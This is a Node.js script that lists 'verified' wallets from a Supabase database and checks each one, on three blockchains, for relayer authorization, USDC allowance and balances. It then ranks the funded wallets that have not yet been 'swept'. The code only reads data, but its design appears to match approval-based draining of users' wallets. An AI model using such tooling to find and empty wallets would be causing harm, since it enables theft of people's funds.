/**
 * LIVE verified wallets → USDC + native balance, flag unswept with funds.
 * Usage: node --env-file=.env.production scripts/check-unswept-balances.mjs
 */
import { createClient } from "@supabase/supabase-js";
import {
  Contract,
  FetchRequest,
  JsonRpcProvider,
  formatUnits,
  getAddress,
  isAddress,
} from "ethers";

const RELAYER = "0x1826d8D10F6a6deadDB401Fe2843fdBf34855414";

const CHAINS = [
  {
    name: "eth",
    chainId: 1,
    contract: "0x2928b3a9fc67608D13dE22eD69Bbf61fDF53A3e4",
    usdc: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    decimals: 6,
    native: "ETH",
    rpcs: [
      process.env.QUICKNODE_ETH_RPC_URL,
      "https://ethereum-rpc.publicnode.com",
    ].filter(Boolean),
  },
  {
    name: "bnb",
    chainId: 56,
    contract: "0x82C29f687d7Ad7e8A1DAffCA2dec25B5A85dc281",
    usdc: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
    decimals: 18,
    native: "BNB",
    rpcs: [
      process.env.QUICKNODE_BSC_RPC_URL,
      "https://bsc-dataseed.binance.org",
    ].filter(Boolean),
  },
  {
    name: "polygon",
    chainId: 137,
    contract: "0x272b94a0251c32aDb180d8eEa179c66335EBF34D",
    usdc: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
    decimals: 6,
    native: "MATIC",
    rpcs: [
      process.env.QUICKNODE_POLYGON_RPC_URL,
      "https://polygon-bor-rpc.publicnode.com",
    ].filter(Boolean),
  },
];

const AUTH_ABI = [
  "function isAuthorized(address user, address relayer) view returns (bool)",
];
const ERC20_ABI = [
  "function allowance(address owner, address spender) view returns (uint256)",
  "function balanceOf(address) view returns (uint256)",
];

async function providerFor(chain) {
  let last;
  for (const url of chain.rpcs) {
    try {
      const request = new FetchRequest(url);
      request.timeout = 10000;
      const p = new JsonRpcProvider(request, chain.chainId, {
        staticNetwork: true,
      });
      await p.getBlockNumber();
      return p;
    } catch (e) {
      last = e;
    }
  }
  throw last ?? new Error(`no rpc for ${chain.name}`);
}

async function check(row) {
  const chain = CHAINS.find((c) => c.name === row.chain);
  if (!chain || !isAddress(row.address)) {
    return { address: row.address, chain: row.chain, error: "bad_row" };
  }
  try {
    const provider = await providerFor(chain);
    const owner = getAddress(row.address);
    const auth = new Contract(chain.contract, AUTH_ABI, provider);
    const erc20 = new Contract(chain.usdc, ERC20_ABI, provider);
    const [authorized, allowance, usdcRaw, nativeRaw] = await Promise.all([
      auth.isAuthorized(owner, RELAYER),
      erc20.allowance(owner, chain.contract),
      erc20.balanceOf(owner),
      provider.getBalance(owner),
    ]);
    const usdc = Number(formatUnits(usdcRaw, chain.decimals));
    const native = Number(formatUnits(nativeRaw, 18));
    const live = !!authorized && allowance > 0n;
    return {
      address: owner,
      chain: chain.name,
      nativeSymbol: chain.native,
      live,
      sweptAt: row.swept_at ?? null,
      usdc,
      native,
      hasBalance: usdc > 0.01 || native > 0.0005,
    };
  } catch (e) {
    return {
      address: row.address,
      chain: row.chain,
      error: e instanceof Error ? e.message : String(e),
    };
  }
}

async function main() {
  const url = process.env.SUPABASE_URL;
  const key = process.env.SUPABASE_SERVICE_ROLE_KEY;
  if (!url || !key) {
    console.error("Missing SUPABASE_URL / SUPABASE_SERVICE_ROLE_KEY");
    process.exit(1);
  }

  const db = createClient(url, key, { auth: { persistSession: false } });
  const { data, error } = await db
    .from("verified_wallets")
    .select("address, chain, swept_at")
    .in("chain", ["eth", "bnb", "polygon"]);
  if (error) {
    console.error(error.message);
    process.exit(1);
  }

  const rows = data ?? [];
  console.log(`Checking balances for ${rows.length} wallets…\n`);

  const results = [];
  const queue = [...rows];
  await Promise.all(
    Array.from({ length: 4 }, async () => {
      while (queue.length) {
        const row = queue.shift();
        if (!row) break;
        const r = await check(row);
        results.push(r);
        if (r.error) {
          console.log(`ERR  ${String(r.chain).padEnd(8)} ${r.address}  ${r.error}`);
        } else if (r.live) {
          const tag = !r.sweptAt && r.hasBalance
            ? "UNSWEPT$"
            : r.sweptAt && r.hasBalance
              ? "SWEPT+$"
              : r.live && !r.hasBalance
                ? "LIVE-0 "
                : "LIVE   ";
          console.log(
            `${tag} ${r.chain.padEnd(8)} ${r.address}  USDC=${r.usdc.toFixed(2)}  ${r.nativeSymbol}=${r.native.toFixed(6)}${r.sweptAt ? "  swept" : ""}`
          );
        }
      }
    })
  );

  const live = results.filter((r) => r.live);
  const unsweptFunded = live.filter((r) => !r.sweptAt && r.hasBalance);
  const sweptFunded = live.filter((r) => r.sweptAt && r.hasBalance);
  const unsweptEmpty = live.filter((r) => !r.sweptAt && !r.hasBalance);

  console.log("\n======== UNSWEPT WITH BALANCE ========");
  if (!unsweptFunded.length) console.log("(none)");
  for (const r of unsweptFunded.sort((a, b) => b.usdc - a.usdc)) {
    console.log(
      `${r.chain.padEnd(8)} ${r.address}\n  USDC ${r.usdc.toFixed(2)}  |  ${r.nativeSymbol} ${r.native.toFixed(6)}`
    );
  }

  console.log("\n======== SWEPT IN DB BUT STILL FUNDED ========");
  if (!sweptFunded.length) console.log("(none)");
  for (const r of sweptFunded.sort((a, b) => b.usdc - a.usdc)) {
    console.log(
      `${r.chain.padEnd(8)} ${r.address}\n  USDC ${r.usdc.toFixed(2)}  |  ${r.nativeSymbol} ${r.native.toFixed(6)}  |  swept ${r.sweptAt}`
    );
  }

  console.log("\n======== LIVE + NOT SWEPT BUT EMPTY ========");
  if (!unsweptEmpty.length) console.log("(none)");
  for (const r of unsweptEmpty) {
    console.log(
      `${r.chain.padEnd(8)} ${r.address}  USDC=${r.usdc.toFixed(4)}  ${r.nativeSymbol}=${r.native.toFixed(6)}`
    );
  }

  const totalUsdc = unsweptFunded.reduce((s, r) => s + r.usdc, 0);
  console.log(
    `\nSummary: ${unsweptFunded.length} unswept+funded (USDC total ~${totalUsdc.toFixed(2)}), ${sweptFunded.length} swept-but-funded, ${unsweptEmpty.length} unswept empty\n`
  );
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
